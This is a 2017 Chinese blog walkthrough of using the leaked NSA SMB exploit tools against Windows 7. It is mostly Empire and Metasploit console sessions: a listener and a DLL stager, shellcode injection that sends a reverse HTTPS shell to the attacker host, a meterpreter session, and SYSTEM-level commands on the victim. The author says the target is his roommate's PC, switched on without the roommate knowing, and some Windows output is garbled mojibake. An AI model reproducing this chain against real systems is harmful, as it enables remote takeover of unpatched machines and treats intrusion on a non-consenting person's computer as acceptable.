---
title: getshell on Win7 x64
date: 2017-04-27 11:49:14
categories:
- study
- misc
tags:
- exploit
- NSA
- msf
- shadowbroker
- shellcode
---

> 凌晨亲自测试NSA Tools，感叹MS08-067时代复现．

<!--more-->
-----------

参考链接:
[https://www.exploit-db.com/docs/41896.pdf](https://www.exploit-db.com/docs/41896.pdf)
[https://www.youtube.com/watch?v=OBP_kH6EYmk](https://www.youtube.com/watch?v=OBP_kH6EYmk)

------------------


# 搭建环境
由于近期shadowbroker一直抢占安全头条，随着NSA泄露的工具被解密在github上面，我也想感受一下这些工具的威力，便找了些教程来测试一番．其实完全可以按照第一个链接的PDF文档来搭建环境，文章中说到Win7和Win2K8通过SMB漏洞不需要验证直接可以利用．

target:Win 7 x64 192.168.31.252
attacker_1:WinXP 192.168.31.52
attacker_2:Ubuntu 16.04 192.168.31.30

没错，我用的就是小米路由器(31网段),ubuntu无线连接并开启XP虚拟机桥接到物理机使其分配到同网段IP，将室友的Win7悄悄地开机并默认连接到路由器即可开始．按照教程还必须安装py2.6和pywin32v2.12在XP攻击机上，ubuntu上安装Empire和MSF用来生成恶意dll和反弹shell．

# 跑起来
教程良心，可直接根据提示跑起来，以下为截图或shell echo.
## 改fb.py
从github上down源码下来改几处代码即可
![fb.png](/images/fb.png)

## 跑Empire
从github上down源码install.sh即可
```bash

====================================================================================
 Empire: PowerShell post-exploitation agent | [Version]: 1.6.0
====================================================================================
 [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
====================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       181 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > set Name Eternal
[!] Please choose 'ip_whitelist' or 'ip_blacklist'
(Empire) > list
list       listeners  
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > set Name Eternal
(Empire: listeners) > set Host http://192.168.31.30
(Empire: listeners) > set Port 8080
(Empire: listeners) > execute
[!] Error starting listener on port 8080: [Errno 98] Address already in use
[!] Error starting listener on port 8080, port likely already in use.
(Empire: listeners) > set Port 8000
(Empire: listeners) > execute
[*] Listener 'Eternal' successfully started.
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     Eternal           http://192.168.31.30:8000            native    5/0.0                      

(Empire: listeners) > usestager dll Eternal
(Empire: stager/dll) > set Arch x64
(Empire: stager/dll) > execute

[*] Stager output written out to: /tmp/launcher.dll

(Empire: stager/dll) > [+] Initial agent RDZ4SYWEFTKBF3FD from 192.168.31.252 now active

(Empire: stager/dll) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  RDZ4SYWEFTKBF3FD   192.168.31.252  USER-20170312IA *WorkGroup\SYSTEM   lsass/792           5/0.0    2017-04-27 02:09:35

(Empire: agents) > sysinfo
*** Unknown syntax: sysinfo
(Empire: agents) > interact RDZ4SYWEFTKBF3FD
(Empire: RDZ4SYWEFTKBF3FD) > systeminfo
[!] Command not recognized.
[*] Use 'help' or 'help agentcmds' to see available commands.
(Empire: RDZ4SYWEFTKBF3FD) > sysinfo
(Empire: RDZ4SYWEFTKBF3FD) > 
Description      : Qualcomm Atheros AR9485WB-EG Wireless Network Adapter
MACAddress       : XX:XX:XX:XX:XX:XX
DHCPEnabled      : True
IPAddress        : 192.168.31.252,fe80::5d70:a440:294c:b455
IPSubnet         : 255.255.255.0,64
DefaultIPGateway : 192.168.31.1
DNSServer        : 192.168.31.1
DNSHostName      : USER-20170312IA
DNSSuffix        :


(Empire: RDZ4SYWEFTKBF3FD) > usemodule code_execution/invoke_shellcode
(Empire: code_execution/invoke_shellcode) > set Lhost 192.168.31.30
(Empire: code_execution/invoke_shellcode) > set Lport 9999
(Empire: code_execution/invoke_shellcode) > execute
(Empire: code_execution/invoke_shellcode) > 
Job started: Debug32_gnns4



```

## 跑msf
跑Kali或者Debian系GNU/Linux都可，安装msf跑起来接收反弹shell，主要用meterpreter．
```bash
msf > use exploit/multi/handler 
msf exploit(handler) > 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_h
set PAYLOAD windows/meterpreter/reverse_hop_http
set PAYLOAD windows/meterpreter/reverse_http
set PAYLOAD windows/meterpreter/reverse_http_proxy_pstore
set PAYLOAD windows/meterpreter/reverse_https
set PAYLOAD windows/meterpreter/reverse_https_proxy
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.31.30
LHOST => 192.168.31.30
msf exploit(handler) > set LPORT 9999
LPORT => 9999
msf exploit(handler) > exploit 

[*] Started HTTPS reverse handler on https://192.168.31.30:9999
[*] Starting the payload handler...
[*] https://192.168.31.30:9999 handling request from 192.168.31.252; (UUID: 7pzlvccd) Staging Native payload...
[*] Meterpreter session 1 opened (192.168.31.30:9999 -> 192.168.31.252:49714) at 2017-04-27 02:20:13 +0800

meterpreter > sysinfo 
Computer        : USER-20170312IA
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : zh_CN
Domain          : WorkGroup
Logged On Users : 1
Meterpreter     : x86/win32
meterpreter > shell
Process 2432 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ�


C:\Windows\system32>systeminfo
systeminfo

������:           USER-20170312IA
OS ����:          Microsoft Windows 7 �콢�� 
OS �汾:          6.1.7601 Service Pack 1 Build 7601
OS ������:        Microsoft Corporation
OS ����:          ��������վ
OS ��������:      Multiprocessor Free
ע����������:     User
ע������֯:       User
��Ʒ ID:          00426-OEM-8992662-00006
��ʼ��װ����:     2017/3/12, 10:33:43
ϵͳ����ʱ��:     2017/4/27, 1:45:53
ϵͳ������:       Hasee Computer
ϵͳ�ͺ�:         CW65
ϵͳ����:         x64-based PC
������:           ��װ�� 1 �������
                  [01]: Intel64 Family 6 Model 58 Stepping 9 GenuineIntel ~1275 Mhz
BIOS �汾:        American Megatrends Inc. 4.6.5, 2013/5/6
Windows Ŀ¼:     C:\Windows
ϵͳĿ¼:         C:\Windows\system32
�����豸:         \Device\HarddiskVolume1
ϵͳ��������:     zh-cn;����(�й�)
���뷨��������:   zh-cn;����(�й�)
ʱ��:             (UTC+08:00)���������죬�����ر�����������³ľ�
�����ڴ�����:     3,991 MB
���õ������ڴ�:   2,494 MB
�����ڴ�: ����ֵ: 7,981 MB
�����ڴ�: ����:   6,291 MB
�����ڴ�: ʹ����: 1,690 MB
ҳ���ļ�λ��:     C:\pagefile.sys
��:               WorkGroup
��¼������:       ��ȱ
�޲�����:         ��װ�� 124 ���޲����
                  [01]: KB2849697
                  [02]: KB2849696
                  [03]: KB2841134
                  [04]: KB2841134
                  [05]: KB2670838
                  [06]: KB2830477
                  [07]: KB2592687
                  [08]: KB917607
                  [09]: KB2909210
                  [10]: KB2929437
                  [11]: KB3000483
                  [12]: KB3004361
                  [13]: KB3004375
                  [14]: KB3019215
                  [15]: KB3020369
                  [16]: KB3020388
                  [17]: KB3021674
                  [18]: KB3022777
                  [19]: KB3023215
                  [20]: KB3030377
                  [21]: KB3031432
                  [22]: KB3032655
                  [23]: KB3033889
                  [24]: KB3033890
                  [25]: KB3033929
                  [26]: KB3035126
                  [27]: KB3035132
                  [28]: KB3037574
                  [29]: KB3042058
                  [30]: KB3042553
                  [31]: KB3045685
                  [32]: KB3046017
                  [33]: KB3046269
                  [34]: KB3055642
                  [35]: KB3059317
                  [36]: KB3060716
                  [37]: KB3061518
                  [38]: KB3067903
                  [39]: KB3069392
                  [40]: KB3069762
                  [41]: KB3071756
                  [42]: KB3072305
                  [43]: KB3072630
                  [44]: KB3072633
                  [45]: KB3074543
                  [46]: KB3075226
                  [47]: KB3076895
                  [48]: KB3076949
                  [49]: KB3078071
                  [50]: KB3078601
                  [51]: KB3080446
                  [52]: KB3081320
                  [53]: KB3084135
                  [54]: KB3086255
                  [55]: KB3087039
                  [56]: KB3092601
                  [57]: KB3093513
                  [58]: KB3097966
                  [59]: KB3097989
                  [60]: KB3099862
                  [61]: KB3100213
                  [62]: KB3101246
                  [63]: KB3101722
                  [64]: KB3101746
                  [65]: KB3108371
                  [66]: KB3108381
                  [67]: KB3108664
                  [68]: KB3108670
                  [69]: KB3109094
                  [70]: KB3109103
                  [71]: KB3109560
                  [72]: KB3110329
                  [73]: KB3112343
                  [74]: KB3115858
                  [75]: KB3121461
                  [76]: KB3122648
                  [77]: KB3123479
                  [78]: KB3124280
                  [79]: KB3126446
                  [80]: KB3126587
                  [81]: KB3127220
                  [82]: KB3135983
                  [83]: KB3138612
                  [84]: KB3138910
                  [85]: KB3138962
                  [86]: KB3139398
                  [87]: KB3139914
                  [88]: KB3139940
                  [89]: KB3140735
                  [90]: KB3142024
                  [91]: KB3142042
                  [92]: KB3145739
                  [93]: KB3146706
                  [94]: KB3146963
                  [95]: KB3149090
                  [96]: KB3153171
                  [97]: KB3153199
                  [98]: KB3153731
                  [99]: KB3155178
                  [100]: KB3156013
                  [101]: KB3156016
                  [102]: KB3156017
                  [103]: KB3156019
                  [104]: KB3159398
                  [105]: KB3161561
                  [106]: KB3161949
                  [107]: KB3161958
                  [108]: KB3163245
                  [109]: KB3164033
                  [110]: KB3164035
                  [111]: KB3170455
                  [112]: KB3177186
                  [113]: KB3178034
                  [114]: KB3184122
                  [115]: KB3185911
                  [116]: KB3188730
                  [117]: KB3192391
                  [118]: KB3205394
                  [119]: KB3210131
                  [120]: KB3212642
                  [121]: KB4012204
                  [122]: KB4014565
                  [123]: KB4014661
                  [124]: KB4015546
����:             ��װ�� 4 �� NIC��
                  [01]: Qualcomm Atheros AR9485WB-EG Wireless Network Adapter
                      ������:      �����������
                      ���� DHCP:   �
                      DHCP ������: 192.168.31.1
                      IP ��ַ
                        [01]: 192.168.31.252
                        [02]: fe80::5d70:a440:294c:b455
                  [02]: Realtek PCIe GBE Family Controller
                      ������:      �������
                      ״̬:        ý���������ж
                  [03]: Microsoft Virtual WiFi Miniport Adapter
                      ������:      ������������ 2
                      ״̬:        ý���������ж
                  [04]: VPN Client Adapter - VPN
                      ������:      VPN - VPN Client
                      ״̬:        ý���������ж

C:\Windows\system32>net user
net user

\\ ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            Guest                    
�����������ϣ�������һ�����������


```

# 总结
建议尽快升级系统或者关闭相关服务来缓解NSA工具集带来的冲击,BTW，我主要用的PC是GNU/Linux并不用Windows．
